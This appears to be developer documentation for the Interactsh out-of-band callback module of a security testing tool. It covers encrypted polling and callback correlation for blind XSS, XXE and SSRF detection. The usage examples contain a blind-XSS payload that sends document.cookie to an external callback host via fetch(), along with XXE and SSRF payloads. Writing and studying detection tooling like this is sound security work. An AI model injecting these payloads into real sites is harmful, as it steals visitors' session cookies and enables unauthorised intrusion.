# Interactsh Integration - Out-Of-Band Interaction Detection
## Blind Vulnerability Detection via External Callbacks

---

## 🎯 OVERVIEW

**Interactsh** is a critical system for detecting **blind vulnerabilities** that don't provide immediate feedback in HTTP responses. It works by generating unique callback URLs that the target server can reach when vulnerabilities execute.

**Use Cases**:
- **Blind XSS**: Admin panel executes payload later
- **XXE (XML External Entity)**: Server fetches external DTD
- **SSRF (Server-Side Request Forgery)**: Server makes outbound request
- **Blind RCE**: Command execution triggers DNS/HTTP callback
- **LDAP Injection**: Blind LDAP queries

**Provider**: [ProjectDiscovery Interactsh](https://github.com/projectdiscovery/interactsh)

---

## 🏗️ ARCHITECTURE

```
┌──────────────────────────────────────────────┐
│         INTERACTSH WORKFLOW                  │
└──────────────────────────────────────────────┘

1. REGISTRATION PHASE:
   ┌─────────────────┐
   │ BugtraceAI CLI  │
   │ InteractshManager│
   └────────┬────────┘
            │
            │ 1a. Generate RSA-2048 keypair
            │ 1b. POST /register
            │     {
            │       "public-key": "...",
            │       "secret-key": "uuid",
            │       "correlation-id": "abc123"
            │     }
            ▼
   ┌─────────────────┐
   │ Interactsh Server│
   │  interact.sh    │
   └────────┬────────┘
            │
            └─> Assigns domain: abc123.interact.sh

2. PAYLOAD INJECTION PHASE:
   ┌─────────────────┐
   │ InteractshManager│
   └────────┬────────┘
            │
            │ 2a. Generate unique subdomain
            │     xyz.abc123.interact.sh
            │
            │ 2b. Create payload with URL
            │     <img src='https://xyz.abc123.interact.sh/xss.png'>
            │
            ▼
   ┌─────────────────┐
   │  Target Server  │
   │  (Vulnerable)   │
   └────────┬────────┘
            │
            │ 2c. Stores payload in database
            │     (admin panel, user profile, etc.)
            │

3. CALLBACK PHASE (ASYNC):
   ┌─────────────────┐
   │   Victim/Admin  │
   │   Views Page    │
   └────────┬────────┘
            │
            │ 3a. Browser renders payload
            │     <img src='https://xyz.abc123.interact.sh/xss.png'>
            │
            ▼
   ┌─────────────────┐
   │ Interactsh Server│
   └────────┬────────┘
            │
            │ 3b. Logs interaction (encrypted)
            │     {
            │       "protocol": "http",
            │       "full-id": "xyz.abc123.interact.sh",
            │       "raw-request": "GET /xss.png ...",
            │       "remote-address": "203.0.113.45"
            │     }
            │

4. POLLING PHASE:
   ┌─────────────────┐
   │ InteractshManager│
   └────────┬────────┘
            │
            │ 4a. Poll every 5 seconds
            │     GET /poll?id=abc123&secret=uuid
            │
            ▼
   ┌─────────────────┐
   │ Interactsh Server│
   └────────┬────────┘
            │
            │ 4b. Returns encrypted interactions
            │     {
            │       "data": ["encrypted_interaction"],
            │       "aes_key": ["rsa_encrypted_aes_key"]
            │     }
            │
            ▼
   ┌─────────────────┐
   │ InteractshManager│
   │  - Decrypt AES key with RSA
   │  - Decrypt data with AES
   │  - Match to original payload
   │  - Trigger callback
   └─────────────────┘
```

---

## 📦 IMPLEMENTATION

### InteractshManager (`bugtrace/core/interactsh_manager.py`)

**Location**: `bugtrace/core/interactsh_manager.py` (220 lines)

**Class Definition**:
```python
class InteractshManager:
    """
    Manages autonomous interactions with the Interactsh server (OOB Interaction).
    Handles registration, encryption keys, polling, and event correlation.
    """
    
    def __init__(
        self, 
        server_url: str = "https://interact.sh",
        token: Optional[str] = None
    ):
        self.server_url = server_url
        self.token = token or str(uuid.uuid4())
        self.correlation_id = uuid.uuid4().hex[:20]
        
        # Cryptography
        self.private_key = None  # RSA-2048
        self.public_key = None
        
        # Session
        self.session = httpx.AsyncClient(verify=False, timeout=30.0)
        self.is_running = False
        self.poll_interval = 5.0  # 5 seconds
        
        # Storage
        self.interactions: List[Dict[str, Any]] = []
        self.payload_context: Dict[str, Dict[str, Any]] = {}
        
        # Callback
        self.on_interaction: Optional[Callable[[Dict], None]] = None
```

---

## 🔐 ENCRYPTION WORKFLOW

### 1. Key Generation

```python
def _generate_keys(self):
    """Generates RSA 2048 key pair."""
    self.private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    self.public_key = self.private_key.public_key()
```

### 2. Registration

```python
async def _register(self):
    """Registers the client with the server."""
    pub_key_b64 = self._get_public_key_b64()  # Base64 SPKI format
    
    payload = {
        "public-key": pub_key_b64,
        "secret-key": self.token,
        "correlation-id": self.correlation_id
    }
    
    await self.session.post(f"{self.server_url}/register", json=payload)
```

### 3. Interaction Decryption

```python
def _decrypt_interaction(
    self, 
    encrypted_key_b64: str, 
    encrypted_data_b64: str
) -> Dict[str, Any]:
    """
    Two-step decryption:
    1. Decrypt AES key using RSA private key
    2. Decrypt data using AES key
    """
    
    # Step 1: RSA decryption of AES key
    enc_key_bytes = base64.b64decode(encrypted_key_b64)
    aes_key = self.private_key.decrypt(
        enc_key_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    # Step 2: AES-CFB decryption of interaction data
    enc_data_bytes = base64.b64decode(encrypted_data_b64)
    iv = enc_data_bytes[:16]  # First 16 bytes
    ciphertext = enc_data_bytes[16:]
    
    cipher = Cipher(
        algorithms.AES(aes_key), 
        modes.CFB(iv), 
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    
    return json.loads(plaintext.decode())
```

**Decrypted Interaction Format**:
```json
{
    "protocol": "http",
    "unique-id": "xyz",
    "full-id": "xyz.abc123.interact.sh",
    "raw-request": "GET /xss.png HTTP/1.1\nHost: xyz.abc123.interact.sh\n...",
    "remote-address": "203.0.113.45",
    "timestamp": "2026-01-02T10:30:45Z"
}
```

---

## 🎯 PAYLOAD GENERATION

### Basic Domain

```python
def get_domain(self) -> str:
    """Returns base domain for payloads."""
    # Format: {correlation_id}.interact.sh
    domain_suffix = self.server_url.replace("https://", "").replace("http://", "")
    return f"{self.correlation_id}.{domain_suffix}"
    
# Example: abc123.interact.sh
```

### Unique Subdomain

```python
def generate_payload_url(self, context_data: Dict[str, Any] = None) -> str:
    """
    Generates unique subdomain for tracking.
    Stores context to correlate callbacks.
    """
    unique_token = uuid.uuid4().hex[:8]  # 8-char random
    base_domain = self.get_domain()
    full_domain = f"{unique_token}.{base_domain}"
    
    # Store context for later correlation
    if context_data:
        self.payload_context[full_domain] = context_data
    
    return full_domain

# Example: xyz12345.abc123.interact.sh
```

---

## 🔄 POLLING MECHANISM

### Start Polling

```python
async def start_polling(self):
    """Starts background polling loop."""
    self.is_running = True
    asyncio.create_task(self._poll_loop())

async def _poll_loop(self):
    """Background task that polls every 5 seconds."""
    logger.info("Interactsh polling started.")
    while self.is_running:
        try:
            await self._poll()
        except Exception as e:
            logger.warning(f"Error during interactsh poll: {e}")
        
        await asyncio.sleep(self.poll_interval)
```

### Poll Request

```python
async def _poll(self):
    """Fetches new interactions from server."""
    url = f"{self.server_url}/poll"
    params = {
        "id": self.correlation_id,
        "secret": self.token
    }
    
    resp = await self.session.get(url, params=params)
    if resp.status_code != 200:
        return
    
    data = resp.json()
    # Format: { "data": [...], "aes_key": [...] }
    
    aes_keys = data.get("aes_key", [])
    encrypted_data = data.get("data", [])
    
    # Decrypt each interaction
    for i, enc_key in enumerate(aes_keys):
        if i < len(encrypted_data):
            decrypted = self._decrypt_interaction(enc_key, encrypted_data[i])
            self._handle_interaction(decrypted)
```

---

## 📍 CONTEXT CORRELATION

### Storing Context

```python
# When generating payload
callback_url = manager.generate_payload_url({
    "type": "blind_xss",
    "target": "https://admin.example.com/profile",
    "parameter": "bio",
    "timestamp": time.time()
})
```

### Matching Callbacks

```python
def _handle_interaction(self, interaction: Dict[str, Any]):
    """
    Correlates interaction to original payload.
    """
    full_id = interaction.get("full-id", "")  # xyz.abc123.interact.sh
    
    # Find matching context
    context = None
    for registered_domain, ctx in self.payload_context.items():
        if registered_domain in full_id:
            context = ctx
            break
    
    if context:
        logger.critical(
            f"🎯 CONFIRMED INTERACTION for {context['type']}: {full_id}"
        )
        interaction['context'] = context
    
    # Store
    self.interactions.append(interaction)
    
    # Trigger callback
    if self.on_interaction:
        self.on_interaction(interaction)
```

---

## 🚀 USAGE EXAMPLES

### Example 1: Blind XSS Detection

```python
from bugtrace.core.interactsh_manager import InteractshManager

# Initialize
manager = InteractshManager()
await manager.initialize()

# Generate callback URL
xss_url = manager.generate_payload_url({
    "type": "blind_xss",
    "target": "https://example.com/api/update_profile",
    "parameter": "bio"
})

# Create payload
payload = f"""
<img src='https://{xss_url}/logo.png' 
     onerror='fetch("https://{xss_url}/exfil?cookie="+document.cookie)'>
"""

# Inject payload
# ... (via HTTP Manipulator or direct request)

# Set up callback handler
def on_blind_xss_hit(interaction):
    print(f"🎯 BLIND XSS TRIGGERED!")
    print(f"Cookie: {interaction['raw-request']}")
    print(f"Victim IP: {interaction['remote-address']}")

manager.on_interaction = on_blind_xss_hit

# Start polling
await manager.start_polling()

# Wait for callbacks (async)
# Polling runs in background
```

### Example 2: XXE Detection

```python
# XXE payload with callback
xxe_url = manager.generate_payload_url({
    "type": "xxe",
    "target": "https://example.com/api/upload_xml"
})

xxe_payload = f"""
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "https://{xxe_url}/xxe">
]>
<root>
    <data>&xxe;</data>
</root>
"""

# Monitor for DNS/HTTP callbacks
```

### Example 3: SSRF Detection

```python
# SSRF with Interactsh
ssrf_url = manager.generate_payload_url({
    "type": "ssrf",
    "target": "https://example.com/api/fetch_url"
})

ssrf_payload = f"https://{ssrf_url}/ssrf-test"

# If server fetches the URL, callback will trigger
```

---

## 🔗 INTEGRATION WITH BUGTRACEAI

### Current Integration:

**1. XXE Module** (`bugtrace/tools/exploitation/xxe.py`):
```python
# Comment indicates planned integration
# In a real engagement, we'd use Interactsh.
```

### Planned Integration:

**1. ExploitAgent**:
```python
async def _blind_xss(self, input_data):
    # Generate Interactsh URL
    callback_url = self.interactsh.generate_payload_url({
        "type": "blind_xss",
        "input": input_data
    })
    
    # Inject payload with callback
    payload = f"<img src='https://{callback_url}/xss.png'>"
    
    # Wait for callback (async)
```

**2. Conductor V2** (validation):
```python
def validate_finding(self, finding_data: dict):
    if finding_data['type'] == 'blind_xss':
        # Check for Interactsh callback
        if not finding_data.get('interactsh_callback'):
            return False, "Blind XSS requires callback proof"
```

---

## 📊 STATISTICS & MONITORING

```python
def get_statistics(self) -> Dict[str, Any]:
    return {
        "correlation_id": self.correlation_id,
        "base_domain": self.get_domain(),
        "domains_generated": len(self.payload_context),
        "interactions_received": len(self.interactions),
        "interaction_types": self._count_by_protocol(),
        "polling_active": self.is_running,
        "poll_interval": self.poll_interval
    }
```

**Example Output**:
```json
{
    "correlation_id": "abc123xyz456",
    "base_domain": "abc123xyz456.interact.sh",
    "domains_generated": 12,
    "interactions_received": 4,
    "interaction_types": {
        "http": 3,
        "dns": 1
    },
    "polling_active": true,
    "poll_interval": 5.0
}
```

---

## ⚠️ LIMITATIONS & CONSIDERATIONS

### 1. Latency
- **Polling interval**: 5 seconds (default)
- **Callback delay**: Can be minutes/hours for blind XSS
- **Best for**: Asynchronous detection

### 2. Public Server
- **Default**: Uses public interact.sh
- **Privacy**: All interactions visible to ProjectDiscovery
- **Alternative**: Self-hosted Interactsh server

### 3. Network Requirements
- **Requires**: Internet connectivity
- **Firewall**: Target must reach external URLs
- **DNS**: DNS resolution must work

### 4. Context Tracking
- **Memory-based**: Payload context in RAM
- **Loss on restart**: Contexts not persisted
- **Future**: Database storage

---

## 🚧 ROADMAP

### Phase 1: Core Functionality ✅
- [x] RSA key generation
- [x] Registration with server
- [x] Encrypted polling
- [x] Context tracking
- [x] Callback correlation

### Phase 2: Integration 🔄
- [ ] ExploitAgent integration
- [ ] Conductor V2 validation
- [ ] Automatic payload injection
- [ ] Result persistence

### Phase 3: Advanced Features ⏳
- [ ] Self-hosted server support
- [ ] Database context storage
- [ ] Multi-protocol support (DNS, SMTP)
- [ ] Real-time notifications

---

## 📚 REFERENCES

- **Interactsh Project**: https://github.com/projectdiscovery/interactsh
- **Interactsh Documentation**: https://github.com/projectdiscovery/interactsh/blob/main/README.md
- **ProjectDiscovery**: https://projectdiscovery.io/

---

**Last Updated**: 2026-01-02 10:42  
**Version**: 1.0  
**Status**: Production Ready  
**Provider**: ProjectDiscovery Interactsh
